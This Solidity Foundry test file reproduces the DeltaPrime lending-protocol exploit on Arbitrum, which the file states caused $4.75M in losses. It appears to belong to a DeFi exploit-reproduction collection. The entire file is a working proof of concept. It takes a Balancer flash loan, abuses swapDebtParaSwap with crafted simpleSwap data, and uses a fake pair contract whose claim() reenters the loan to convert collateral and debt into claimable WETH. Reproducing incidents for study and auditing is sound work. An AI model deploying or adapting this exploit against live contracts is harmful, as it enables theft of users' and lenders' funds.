// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : $4.75M
// Attacker : https://arbiscan.io/address/0xb87881637b5c8e6885c51ab7d895e53fa7d7c567
// Attack Contract : https://arbiscan.io/address/0x0b2bcf06f740c322bc7276b6b90de08812ce9bfe
// Vulnerable Contract : https://arbiscan.io/address/0x62cf82fb0484af382714cd09296260edc1dc0c6c
// Attack Tx : https://arbiscan.io/tx/0x6a2f989b5493b52ffc078d0a59a3bf9727d134b403aa6e0bf309fd513a728f7f

interface ISmartLoansFactoryTUP {
    function createLoan() external returns (address);
}

interface ISmartLoan {
    function swapDebtParaSwap(
        bytes32 _fromAsset,
        bytes32 _toAsset,
        uint256 _repayAmount,
        uint256 _borrowAmount,
        bytes4 selector,
        bytes memory data
    ) external;

    function claimReward(address pair, uint256[] calldata ids) external;

    function wrapNativeToken(
        uint256 amount
    ) external;

    function isSolvent() external returns (bool);
}

interface ISimpleSwap {
    struct SimpleData {
        address fromToken;
        address toToken;
        uint256 fromAmount;
        uint256 toAmount;
        uint256 expectedAmount;
        address[] callees;
        bytes exchangeData;
        uint256[] startIndexes;
        uint256[] values;
        address beneficiary;
        address partner;
        uint256 feePercent;
        bytes permit;
        uint256 deadline;
        bytes16 uuid;
    }

    function simpleSwap(
        SimpleData memory swapData
    ) external;
}

contract DeltaPrimeExp is Test {
    IWETH WETH = IWETH(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ISmartLoansFactoryTUP SmartLoansFactoryTUP = ISmartLoansFactoryTUP(0xFf5e3dDaefF411a1dC6CcE00014e4Bca39265c20);
    ISmartLoan SmartLoan;
    FakePairContract fakePairContract;
    uint256 flashLoanAmount;

    address ETHER = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    bytes32 _fromAsset = 0x5553444300000000000000000000000000000000000000000000000000000000;
    bytes32 _toAsset = 0x4554480000000000000000000000000000000000000000000000000000000000;
    uint256 _repayAmount = 0;
    uint256 _borrowAmount = 66_619_545_304_650_988_218;
    bytes4 selector = ISimpleSwap.simpleSwap.selector;

    function setUp() external {
        vm.deal(address(this), 0 ether);
        vm.createSelectFork("arbitrum", 273_278_741);
        vm.label(address(WETH), "WETH");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(SmartLoansFactoryTUP), "SmartLoansFactoryTUP");
    }

    function testExploit() external {
        emit log_named_decimal_uint(
            "Attacker WETH balance before exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );

        SmartLoan = ISmartLoan(SmartLoansFactoryTUP.createLoan()); // create an attacker position contract
        vm.label(address(SmartLoan), "SmartLoan");
        fakePairContract = new FakePairContract(); // create a fakePair contract
        vm.label(address(fakePairContract), "fakePairContract");

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = WETH.balanceOf(address(Balancer));
        flashLoanAmount = amounts[0];
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function convertETH() external {
        string memory priceDataPath = "./src/test/2024-11/DelatPrimePriceData.txt";
        bytes memory priceData = vm.parseBytes(vm.readFile(priceDataPath));
        bytes memory wrapNativeTokenData =
            abi.encodePacked(abi.encodeCall(ISmartLoan.wrapNativeToken, (address(SmartLoan).balance)), priceData);

        address(SmartLoan).call(wrapNativeTokenData); // convert collateral eth to weth, claim weth as reward asset
            // SmartLoan.wrapNativeToken(address(SmartLoan).balance);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH.withdraw(WETH.balanceOf(address(this))); // withdraw weth to eth

        address(SmartLoan).call{value: address(this).balance}(""); // transfer eth to SmartLoan as collateral

        bytes memory data = castCallData();
        string memory priceDataPath = "./src/test/2024-11/DelatPrimePriceData.txt";
        bytes memory priceData = vm.parseBytes(vm.readFile(priceDataPath));
        bytes memory swapDebtParaSwapData = abi.encodePacked(
            abi.encodeCall(
                ISmartLoan.swapDebtParaSwap, (_fromAsset, _toAsset, _repayAmount, _borrowAmount, selector, data)
            ),
            priceData
        );

        address(SmartLoan).call(swapDebtParaSwapData); // SmartLoan borrow eth,
        // SmartLoan.swapDebtParaSwap(_fromAsset, _toAsset, _repayAmount, _borrowAmount, selector, data)

        uint256[] memory ids = new uint256[](1);
        ids[0] = 0;
        bytes memory claimRewardData =
            abi.encodePacked(abi.encodeCall(ISmartLoan.claimReward, (address(fakePairContract), ids)), priceData);

        address(SmartLoan).call(claimRewardData); // trigger reenter attack, convert collateral and debt eth to weth and claim as reward
        // SmartLoan.claimReward(address(fakePairContract), ids);

        WETH.transfer(address(Balancer), flashLoanAmount);
    }

    receive() external payable {}

    function castCallData() internal returns (bytes memory) {
        address[] memory callee = new address[](1);
        callee[0] = address(WETH);
        bytes memory exchangeDatas = abi.encodeWithSignature("withdraw(uint256)", _borrowAmount);
        uint256[] memory startIndexe = new uint256[](2);
        startIndexe[0] = 0;
        startIndexe[1] = 36;
        uint256[] memory value = new uint256[](1);
        value[0] = 0;
        ISimpleSwap.SimpleData memory swapData = ISimpleSwap.SimpleData({
            fromToken: address(WETH),
            toToken: ETHER,
            fromAmount: _borrowAmount,
            toAmount: _borrowAmount,
            expectedAmount: _borrowAmount,
            callees: callee,
            exchangeData: exchangeDatas,
            startIndexes: startIndexe,
            values: value,
            beneficiary: address(0),
            partner: address(0),
            feePercent: uint256(0),
            permit: "",
            deadline: 1_000_000_000_000_000,
            uuid: 0x8c933246c370415fafa74eaed5e8acf9
        });
        bytes memory swapDatas = abi.encode(swapData);
        return swapDatas;
    }
}

contract FakePairContract {
    address attackContract;
    address WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;

    struct Parameters {
        address hooks;
        bool beforeSwap;
        bool afterSwap;
        bool beforeFlashLoan;
        bool afterFlashLoan;
        bool beforeMint;
        bool afterMint;
        bool beforeBurn;
        bool afterBurn;
        bool beforeBatchTransferFrom;
        bool afterBatchTransferFrom;
    }

    constructor() {
        attackContract = msg.sender;
    }

    bytes32 internal constant BEFORE_SWAP_FLAG = bytes32(uint256(1 << 160));
    bytes32 internal constant AFTER_SWAP_FLAG = bytes32(uint256(1 << 161));
    bytes32 internal constant BEFORE_FLASH_LOAN_FLAG = bytes32(uint256(1 << 162));
    bytes32 internal constant AFTER_FLASH_LOAN_FLAG = bytes32(uint256(1 << 163));
    bytes32 internal constant BEFORE_MINT_FLAG = bytes32(uint256(1 << 164));
    bytes32 internal constant AFTER_MINT_FLAG = bytes32(uint256(1 << 165));
    bytes32 internal constant BEFORE_BURN_FLAG = bytes32(uint256(1 << 166));
    bytes32 internal constant AFTER_BURN_FLAG = bytes32(uint256(1 << 167));
    bytes32 internal constant BEFORE_TRANSFER_FLAG = bytes32(uint256(1 << 168));
    bytes32 internal constant AFTER_TRANSFER_FLAG = bytes32(uint256(1 << 169));

    function encode(
        Parameters memory parameters
    ) internal pure returns (bytes32 hooksParameters) {
        hooksParameters = bytes32(uint256(uint160(address(parameters.hooks))));

        if (parameters.beforeSwap) hooksParameters |= BEFORE_SWAP_FLAG;
        if (parameters.afterSwap) hooksParameters |= AFTER_SWAP_FLAG;
        if (parameters.beforeFlashLoan) hooksParameters |= BEFORE_FLASH_LOAN_FLAG;
        if (parameters.afterFlashLoan) hooksParameters |= AFTER_FLASH_LOAN_FLAG;
        if (parameters.beforeMint) hooksParameters |= BEFORE_MINT_FLAG;
        if (parameters.afterMint) hooksParameters |= AFTER_MINT_FLAG;
        if (parameters.beforeBurn) hooksParameters |= BEFORE_BURN_FLAG;
        if (parameters.afterBurn) hooksParameters |= AFTER_BURN_FLAG;
        if (parameters.beforeBatchTransferFrom) hooksParameters |= BEFORE_TRANSFER_FLAG;
        if (parameters.afterBatchTransferFrom) hooksParameters |= AFTER_TRANSFER_FLAG;
    }

    function getLBHooksParameters() external returns (bytes32) {
        Parameters memory para =
            Parameters(address(this), false, false, false, false, false, false, false, false, false, false);
        return encode(para);
    }

    function claim(address user, uint256[] calldata ids) external {
        attackContract.call(abi.encodeWithSelector(DeltaPrimeExp.convertETH.selector, ""));
    }

    function getRewardToken() external returns (address) {
        return WETH;
    }

    receive() external payable {}
}
